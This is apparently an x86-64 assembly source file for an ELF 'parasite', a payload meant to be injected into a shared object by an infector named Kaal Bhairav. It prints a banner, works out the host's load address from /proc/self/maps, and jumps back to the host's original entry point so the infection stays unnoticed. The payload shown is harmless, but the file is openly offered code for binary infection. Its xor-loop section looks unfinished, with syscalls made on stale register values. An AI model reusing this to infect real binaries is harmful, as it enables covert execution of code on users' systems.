BITS 64

; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com

; Description : This parasite is foccused to be injected in a shared object. Jump-on-exit needs to be
;               an absolute address rather than an offset (so contains only the offsets and no 
;               virtual addresses). So, parasite calculates the base address (where the infected 
;               binary is loaded at runtime) and adds the base address to the offset 
;               (0xAAAAAAAAAAAAAAAA) to get an absolute address @ which the jump will happen.
;                       
;               Shellcode prints a message, generates an absolute address to transfer control to a 
;               virtual address (entry point of running shared object code)
;
; base_address_of_infected_binary = First few bytes of '/proc/self/maps' (before char '-' : 0x2d)
; Jmp_on_Exit_address             = base_address_of_infected_binary + 0xAAAAAAAAAAAAAAAA
;


global _start


;-x-x-x-x- CONSTANTS -x-x-x-x-;
STDIN       equ 0
STDOUT      equ 1
STDERR      equ 2

SYS_WRITE   equ 0x1         ; 1
SYS_EXIT    equ 0x3c        ; 60
SYS_READ    equ 0x0         ; 0
SYS_OPEN    equ 0x2         ; 2
SYS_CLOSE   equ 0x3         ; 3
SYS_LSEEK   equ 0x8         ; 8
SYS_EXECVE  equ 0x3b        ; 59
ALLOC_SPACE equ 0x20		; 16 bytes

O_RDONLY    equ 0x0         ; 0


KEY_ADDR    equ 0x18        ; 24 bytes
;-x-x-x-x- CONSTANTS -x-x-x-x-;



section .text
_start:
	; Save register state, RBX can be safely used
	push rax
	push rcx
	push rdx
	push rdi
	push r11
	push r12
	push r13
	
	jmp	parasite
	message:	db	"-x-x-x-x- \_<O>_<O>_/ -x-x-x-x-", 0xa
	filepath:   db  "/proc/self/maps", 0x0          ; 16 bytes
	newline:	db 	0xa


parasite:

	; Print our message
	; %rax      | %rdi | %rsi | %rdx
	; sys_write	|  fd  | *buf | count

	xor	rax, rax					; Zero out RAX
	add	rax, SYS_WRITE				; Syscall number of write() - 0x1
	mov rdi, rax					; File descriptor - 0x1 (STDOUT)
	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
									; dynamically identifying the address of the 'message' label.
	xor rdx, rdx
	mov dl, 0x20					; message size = 30 bytes
	syscall

;--------------------------------------------------------------------

unxor:

	; Print our message
	; %rax      | %rdi | %rsi | %rdx
	; sys_write	|  fd  | *buf | count

	xor rax, rax
	add	rax, 0x01
	mov rdi, rax
	lea rsi, [rel _start-24]
	xor rdx, rdx
	mov dl, 0x10
	syscall

	xor rax, rax
	add	rax, 0x01
	mov rdi, rax
	lea rsi, [rel newline]
	xor rdx, rdx
	mov dl, 0x1
	syscall

	xor r12, r12
	%define countK r12b
	mov countK,0

	xor r13, r13
	lea r13, [rel _start - KEY_ADDR]

xorLoop:
	mov rsi, r13
	syscall
	mov byte [r13], 0x41
	lea rsi, [rel newline]
	syscall

	cmp countK, 14
	je endXorLoop

	inc countK
	inc r13

	jmp xorLoop

endXorLoop:

	lea r13, [rel _start - KEY_ADDR]
	mov countK,0
xorLoopbis:
	mov rsi, r13
	syscall
	lea rsi, [rel newline]
	syscall

	cmp countK, 14
	je endXorLoopbis

	inc countK
	inc r13

	jmp xorLoopbis

endXorLoopbis:

;--------------------------------------------------------------------

	; open file in memory
	; %rax      |   %rdi    | %rsi  | %rdx
	; sys_open  | *filename | flags | mode
	; return fd -> %eax

	xor rax, rax
	xor rdi, rdi
	lea	rdi, [rel filepath] 	; pathname
	xor rsi, rsi				; 0 for O_RDONLY macro
	mov al, SYS_OPEN			; syscall number for open()
	syscall

;--------------------------------------------------------------------

    xor r10, r10                ; Zeroing out temporary registers
    xor r8, r8
    xor rdi, rdi
    xor rbx, rbx
    mov dil, al
    sub sp, ALLOC_SPACE         ; allocate space for /proc/<pid>/maps memory address string 
                                ; (Max 16 chars from file | usually 12 chars 5567f9154000)
    lea rsi, [rsp]              ; *buf  : get the content to be read on stack
    xor rdx, rdx
    mov dx, 0x1                 ; count : Read 0x1 byte from file at a time
    xor rax, rax


; R10 to store count of chars before '-' in /proc/self/maps
; R8 to store the extracted digit/alphabet
; Don't change RAX, RDI, RSI, RDX registers.
; RBX will store the final result (the address computed)
read_characters:
	; %rax      | %rdi | %rsi | %rdx
	; sys_read  |  fd  | *buf | count

    xor rax, rax                ; Syscall Number for read : 0x0
    syscall                     ; Byte read at [rsp]
    cmp BYTE [rsp], 0x2d		; if read_byte == 0x2d ('-')
	je  done					; stop reading from file, Address is loaded into RBX
	add r10b, 0x1				; count the number of characters read before 0x2d ('-')
	mov r8b, BYTE [rsp]         ; get the read byte in R8

    ; Check for a digit (chars/ints 0x30 : 1(in dec) to 0x39 : 9(in dec) - convert into hex)
    cmp r8b, 0x39
    jle digit_found

alphabet_found:
    ; Character read is an alphabet [a-f], do the math to convert char(int) into equivalent hex
    sub r8b, 0x57               ; R8 stores the extracted byte (0x62('b') - 0x57 = 0xb)
    jmp load_into_rbx

; Convert the char byte (eg: 0x35 for '5') to its equivalent hex (eg: '5'(0x35) to 0x5)
; R10 Stores count : i.e. no. of characters (of base address) read as bytes
; R8 stores the converted byte (to be placed into RBX to make actual base address of binary)
digit_found:
    sub r8b, 0x30               ; r8 stores Extracted byte

load_into_rbx:
	shl rbx, 0x4
    or  rbx, r8

loop:
    add rsp, 0x1                ; increment RSI to read character at next location
    lea rsi, [rsp]
    jmp read_characters


done:
	sub sp, r10w				; subtract stack pointer by no. of chars (which are pushed on stack)
	add sp, ALLOC_SPACE			; add 16 bytes to RSP (which were reserved for reading address chars)
	xor r8, r8
	mov r8, rbx                 ; r8 stores the base address where the infected binary is loaded
    mov r10, 0xAAAAAAAAAAAAAAAA
    add r10, r8                 ; Computing final jmp-on-exit address


;-------------------------------------------------------------------

close_file:
	; %rax      | %rdi
	; sys_close |  fd

	xor rax, rax
	mov rax, SYS_CLOSE
	syscall


address_loaded_in_RBX:
	; Restoring register state
	pop r13
	pop r12
	pop r11
	pop rdi
	pop rdx
	pop rcx
	pop rax
	
	; RBX contains the base address (where the program is loaded in memory), adding the offset of
	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
	jmp	r10
